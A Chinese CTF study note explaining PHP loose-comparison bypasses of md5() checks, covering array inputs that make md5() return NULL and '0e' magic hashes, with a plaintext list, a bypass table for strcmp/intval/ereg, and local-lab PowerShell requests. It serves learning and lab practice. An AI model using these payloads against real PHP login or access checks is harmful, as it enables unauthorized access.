# PHP 弱类型与 md5() 绕过 —— 做题笔记

> 适用题型：源码里出现 `md5($_GET['x']) == md5($_POST['y'])`、`==`、`0e`、`strcmp`、`intval`
> 本地靶子：`D:\XiaoMibook\CTF学习\md5_array_lab\`（PHP 7.3.4，phpstudy）
> 记录时间：2026-10-26

## 原题

```php
<?php
highlight_file(__FILE__);
include 'flag2.php';

if (isset($_GET['name']) && isset($_POST['password'])){
    $name = $_GET['name'];
    $password = $_POST['password'];
    if ($name != $password && md5($name) == md5($password)){
        echo $flag;
    } else { echo "wrong!"; }
} else { echo 'wrong!'; }
?>
```

## 一眼看懂矛盾点

要求「**值不同**」但「**md5 相同**」。
正常人会想去找 MD5 碰撞 → 死路。
正确思路：**不是去找碰撞，而是让 `md5()` 算不出正常结果。**

## 核心原理：`md5()` 收到数组 → 返回 NULL

```
$name = ['a']   $password = ['b']

$name != $password   →  ['a'] != ['b']  →  true   ✅ 数组内容不同
md5(['a'])           →  NULL   (类型不对不中断执行，只返回 NULL + 喷一个 Warning)
md5(['b'])           →  NULL
NULL == NULL         →  true   ✅
```

**关键认知**：PHP 5/7 的内部函数在非严格模式下遇到无法转换的参数，**不是报错停止，而是返回 NULL 继续往下跑**。两个 NULL 自然相等。

## 本地实测（PHP 7.3.4，php -S 起靶机）

| 实验 | GET | POST body | 结果 |
|---|---|---|---|
| ① | 不给 | — | `wrong!` |
| ② | `name=a` | `password=b` | `wrong!` 老实给值必挂 |
| ③ | `name[]=a` | `password[]=a` | `wrong!` **两边同值必挂** |
| ④ | `name[]=a` | `password[]=b` | ✅ **flag** |
| ⑤ | `name[]=a`（方括号不编码） | `password[]=b` | ✅ **flag** |
| ⑥ | `name=QNKCDZO` | `password=240610708` | ✅ **flag**（0e 路线） |
| ⑦ | `name[]=a` | 不给 POST | `wrong!` `isset()` 拦住 |

成功响应里服务器自己喷出的警告，就是绕过成立的铁证：

```
Warning: md5() expects parameter 1 to be string, array given in index.php on line 8
NSSCTF{...}
```

## 怎么打（HackBar 四控件）

```
URL             ：http://<题目地址>/?name[]=a
Use POST method ：打开
enctype         ：application/x-www-form-urlencoded（别动）
Body            ：password[]=b
```

三个必查点：

1. **两边值必须不同**（`['a'] != ['a']` 是 false → 挂）
2. **GET 和 POST 必须都给**（`isset()` 双检）
3. 方括号建议写成 `%5B%5D`，编不编码本题都能过，但养成习惯（同 `&` 那个坑）

## 第二条路：0e 弱类型（科学计数法）

```php
md5('QNKCDZO')   = "0e830400451993494058024219903391"
md5('240610708') = "0e462097431906509019562988736854"
```

`0e` + 全数字 → PHP 当它是科学计数法 → 两边都等于 `0` → `==` 成立。

常用 0e 明文（md5 后是 0e 开头）：
`QNKCDZO`、`240610708`、`s878926199a`、`s155964371a`、`s2145873871a`、`s2146663357a`、`s894343897`、`s3002851`

## 两条路怎么选

| | 数组绕过 | 0e 绕过 |
|---|---|---|
| 原理 | `md5()` 返回 `NULL` | 科学计数法当数字比 |
| 过 `==` | ✅ | ✅ |
| **过 `===`** | ✅ `NULL === NULL` 为 true | ❌ 字符串本身不同 |
| PHP 8.0+ | ❌ 抛 `TypeError` → 500 | ❌ 改为纯字符串比较 |

- 代码写 `===` → 只有数组绕过能救（且目标必须 PHP ≤ 7）
- 目标是 PHP 8 → 两条都失效，得去找逻辑洞 / 真碰撞 / 别的绕过

## 同类绕过家族（遇到对应函数就套）

| 函数 | 传数组会怎样 | 绕过式 |
|---|---|---|
| `md5()` / `sha1()` | 返回 `NULL` | `?a[]=1` + `b[]=2` |
| `strcmp()` (PHP<8) | 返回 `NULL` | `?a[]=1` → `!strcmp($a, $b)` 为真 |
| `ereg()` / `eregi()` | 返回 `false` | `%00` 截断（PHP<5.3.4） |
| `intval()` | 数组返回 `1` | `?a[]=1` → `intval($a)` 非 0 |
| `is_numeric()` | 数组返回 `false` | 反过来自带绕过 |
| `array_key_exists` / `in_array` (PHP<8.0 loose) | — | `in_array('abc',[0,1])` 为 true |
| `json_decode` + `==` | — | 见「简单GET/POST」那题 |

## 本地靶子怎么重跑

```powershell
$php = "D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe"

# 1) 只看逻辑，不起服务
& $php "D:\XiaoMibook\CTF学习\md5_array_lab\test_logic.php"

# 2) 起完整靶机（窗口留着别关）
& $php -S 127.0.0.1:8123 -t "D:\XiaoMibook\CTF学习\md5_array_lab\www"

# 3) 另开一个窗口打
Invoke-WebRequest "http://127.0.0.1:8123/?name%5B%5D=a" -Method POST `
  -Body "password%5B%5D=b" -ContentType "application/x-www-form-urlencoded" -UseBasicParsing | % Content
```

目录结构：

```
md5_array_lab/
├── test_logic.php      # 逐条验证 != 和 == 是否成立
└── www/
    ├── index.php       # 原题源码（一模一样）
    └── flag2.php       # 假 flag，方便确认逻辑走通
```

## Flag

```
（本题需真实靶机地址；本地验证用假 flag：NSSCTF{LOCAL_TEST_array_bypass_ok}）
```
